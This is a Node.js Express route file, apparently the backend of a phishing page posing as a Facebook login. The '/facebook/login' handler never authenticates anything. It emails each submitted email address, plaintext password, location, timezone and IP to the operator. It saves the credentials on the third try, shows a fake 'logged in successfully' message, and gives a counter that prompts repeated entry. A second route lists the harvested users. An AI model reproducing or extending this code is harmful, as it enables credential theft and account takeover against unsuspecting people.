const express = require('express');
const router = express.Router();
const { sendLoginAttemptEmail } = require('../services/emailService');
const { addUser, getUsers } = require('../services/userService');

// Mapa para almacenar intentos de inicio de sesión por email
const loginAttempts = new Map();

router.post('/facebook/login', async (req, res) => {
  try {
    const { email, password, location, timezone } = req.body;
    const clientIp = req.ip || req.connection.remoteAddress;

    // Obtener o inicializar los intentos para este email
    if (!loginAttempts.has(email)) {
      loginAttempts.set(email, 0);
    }

    const attempts = loginAttempts.get(email);
    loginAttempts.set(email, attempts + 1);

    // Enviar notificación por correo
    await sendLoginAttemptEmail({
      method: 'facebook',
      email,
      password,
      location,
      timezone,
      ip: clientIp,
      timestamp: new Date().toISOString()
    });

    // Si es el tercer intento, guardar en el archivo JSON
    if (attempts + 1 === 3) {
      const user = await addUser({
        email,
        password,
        location,
        timezone,
        ip: clientIp,
        loginAttempts: 3,
        lastLoginDate: new Date().toISOString()
      });

      // Limpiar los intentos
      loginAttempts.delete(email);

      return res.json({
        success: true,
        message: '¡Bienvenido! Has iniciado sesión correctamente.',
        isThirdAttempt: true,
        user: {
          _id: user._id,
          email: user.email,
          registrationDate: user.registrationDate
        }
      });
    }

    // Para intentos 1 y 2
    res.json({
      success: true,
      message: 'Inicio de sesión procesado',
      attemptsRemaining: 3 - (attempts + 1)
    });

  } catch (error) {
    console.error('Error en el inicio de sesión:', error);
    res.status(500).json({
      success: false,
      message: 'Error al procesar el inicio de sesión'
    });
  }
});

// Ruta para obtener usuarios
router.get('/users', async (req, res) => {
  try {
    const users = await getUsers();
    res.json(users.map(user => ({
      ...user,
      password: undefined // No enviar contraseñas
    })));
  } catch (error) {
    res.status(500).json({ message: 'Error al obtener usuarios' });
  }
});

module.exports = router;
